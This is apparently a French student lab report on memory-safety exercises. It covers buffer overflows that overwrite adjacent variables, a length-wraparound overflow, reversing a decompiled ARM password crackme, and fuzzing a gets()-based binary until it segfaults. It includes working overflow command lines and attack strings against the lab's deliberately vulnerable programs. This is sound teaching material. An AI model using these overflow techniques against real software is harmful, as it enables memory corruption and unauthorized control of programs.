# Securité - TP 3

---

## Exercice 1

Pour changer la variable `modified`, il faut surcharger le buffer lorsque l'on rentre le string, de manière à écrire au delà de la mémoire attribuée au buffer, et ainsi changer le string. 

Dans ce sens, en rentrant 67 caractères, nous arrivons à changer modified : `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`. 

## Exercice 2

### 1.

Le programme prend en paramètre 2 strings ainsi que leur nombre de caractères. Il rend dans le buffer les 2 strings concaténés, avec les tailles des 2 strings additionnés. 
Cela étant, si on ne donne pas la bonne taille pour les 2 strings (par exemple une taille plus petite que la taille réelle du string), alors seul le nombre de caractères spécifié en paramètre sera pris dans le string. 

**Exemple :**

```bash
./exo 2 coucou bateau 6 6 ---> buffer : coucoubateau, len1+len2 = 12
./exo 2 coucou bateau 5 6 ----> buffer : coucobateau, len1+len2 = 11
```

### 2.

Un unsigned char fait 1 octet.

### 3.

Pour changer la valeur de secret, il faut tout simplement que la valeur de len1 + len2 soit supérieure à 255. 

### 4.

Commande qui fonctionne : 

```bash
./a.out a BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 255 161
``` 

Nous avons commencé par utiliser une première chaîne très courte, `a`, pour occuper uniquement le premier octet du tableau `buffer`. Ensuite, une deuxième chaîne composée de 255 caractères `B` a été utilisée, dont une partie a dépassé les 200 octets alloués pour `buffer`, écrasant la variable `secret` située juste après. En contrôlant précisément cette longueur, nous avons fait en sorte que le caractère `B`, correspondant à `0x42` en ASCII, soit copié à l'emplacement mémoire de `secret`, lui attribuant ainsi cette valeur.

## Exercice 3

### code du main décompilé : 

```c
undefined4 main(void) {

  char *pcVar1;
  size_t sVar2;
  int iVar3;
  char local_58 [24];
  undefined2 local_40;
  char acStack_3c [32];
  uint local_1c;
  
  builtin_strncpy(local_58,"`a_kileh]pekj[]ni[naqooe",0x18);
  local_40 = 0x61;
  puts("=== Break My ARM ===");
  printf("Password: ");
  pcVar1 = fgets(acStack_3c,0x1e,stdin);

  if (pcVar1 != (char *)0x0) {

    sVar2 = strcspn(acStack_3c,"\n");
    acStack_3c[sVar2] = '\0';
    local_1c = 0;

    while (sVar2 = strlen(acStack_3c), local_1c < sVar2) {
      acStack_3c[local_1c] = acStack_3c[local_1c] + -4;
      local_1c = local_1c + 1;
    }

    iVar3 = strcmp(acStack_3c,local_58);

    if (iVar3 == 0) {
      puts("\nCongrats! Flag is the password");
    }
    else {
      puts("\nNope. You need to feel the Force, young Padawan.");
    }
  }

  return 0;
}
```

### Explication du programme

**Initialisation des variables :**

* local_58 : Contient une chaîne de caractères initialisée avec "a_kileh]pekj[]ni[naqooe".
* acStack_3c : Utilisé pour stocker le mot de passe entré par l'utilisateur.

### Affichage et entrée de l'utilisateur

Le programme affiche "=== Break My ARM ===", puis demande un mot de passe via la fonction fgets, qui stocke le mot de passe saisi dans la variable acStack_3c.

### Décalage des caractères du mot de passe

Ensuite, il y a une boucle while qui itère sur chaque caractère de la chaîne acStack_3c. Chaque caractère est décrémenté de 4 (c'est-à-dire que chaque caractère est décalé de -4 dans la table ASCII).

### Comparaison avec la chaîne codée en dur

Le mot de passe modifié est ensuite comparé à la chaîne codée en dur dans local_58 : "a_kileh]pekj[]ni[naqooe".
Si le mot de passe modifié correspond à cette chaîne, le programme affiche "\nCongrats! Flag is the password".
Sinon, il affiche "\nNope. You need to feel the Force, young Padawan.".

### Trouver le mot de passe

Le programme attend un mot de passe décalé de -4 par rapport à la chaîne "a_kileh]pekj[]ni[naqooe". En ajoutant 4 à chaque caractère, le mot de passe correct à entrer est "e_compilationbareussi".



## Exercice 4

## 1.

La fonction `gets()` est signalée comme dangereuse par le compilateur. Il est connu que cette fonction permet un buffer overflow car elle ne limite pas la quantité de données saisies. Cela signifie que si un utilisateur entre plus de 128 caractères (la taille du buffer...), les données supplémentaires vont déborder en mémoire, écrasant d'autres variables ou le retour d'adresse du programme.

```bash
clang -o rop vulnerable.c -m64 -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static

vulnerable.c:8:5: warning: implicit declaration of function 'gets' is invalid in C99 [-Wimplicit-function-declaration]
    gets(buff);
    ^
1 warning generated.
/usr/bin/ld: /tmp/vulnerable-90c7ba.o: in function `main':
vulnerable.c:(.text+0x23): warning: the `gets' function is dangerous and should not be used.
```

## 2.

### Première série de tests

```bash
perl -e 'print "A"x150' | ./rop
perl -e 'print "A"x200' | ./rop
perl -e 'print "A"x300' | ./rop
perl -e 'print "A"x350' | ./rop
perl -e 'print "A"x400' | ./rop

You password is incorrect
You password is incorrect
[1]    1842712 done                perl -e 'print "A"x200' | 
       1842713 segmentation fault  ./rop
You password is incorrect
[1]    1842714 done                perl -e 'print "A"x300' | 
       1842715 segmentation fault  ./rop
You password is incorrect
[1]    1842716 done                perl -e 'print "A"x350' | 
       1842717 segmentation fault  ./rop
You password is incorrect
[1]    1842718 done                perl -e 'print "A"x400' | 
       1842719 segmentation fault  ./rop
``` 

### Seconde série de tests

```bash
perl -e 'print "A"x160' | ./rop
perl -e 'print "A"x170' | ./rop
perl -e 'print "A"x180' | ./rop
perl -e 'print "A"x190' | ./rop
perl -e 'print "A"x195' | ./rop

You password is incorrect
[1]    1842722 done                perl -e 'print "A"x160' | 
       1842723 segmentation fault  ./rop
You password is incorrect
[1]    1842724 done                perl -e 'print "A"x170' | 
       1842725 segmentation fault  ./rop
You password is incorrect
[1]    1842726 done                perl -e 'print "A"x180' | 
       1842727 segmentation fault  ./rop
You password is incorrect
[1]    1842728 done                perl -e 'print "A"x190' | 
       1842729 segmentation fault  ./rop
You password is incorrect
[1]    1842730 done                perl -e 'print "A"x195' | 
       1842731 segmentation fault  ./rop
```

150 caractères ne suffisent pas pour causer un segmentation fault, mais à partir de 160 caractères, le buffer déborde et l'écrasement se produit.

## Exercice 5

### Analyse du code

L'argument passé (via argv[1]) est copié dans le tampon buffer avec strcpy(), mais il n'y a pas de vérification sur la taille de l'argument. Etant donné que le buffer est déclaré avec une taille 64, cela ouvre la porte à une vulnérabilité de dépassement de tampon. Le dépassement du tampon pourrait permettre d'écraser des variables situées après buffer en mémoire, ici la variable modified.

* La variable modified est située après buffer en mémoire. Le tampon a une taille de 64 octets, donc il faut envoyer au moins 64 octets pour remplir buffer, puis 4 octets supplémentaires pour écraser modified.

* Pour exploiter le programme, nous pouvons utiliser cette chaine d'attaque :

    
`./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \x64\x63\x62\x61`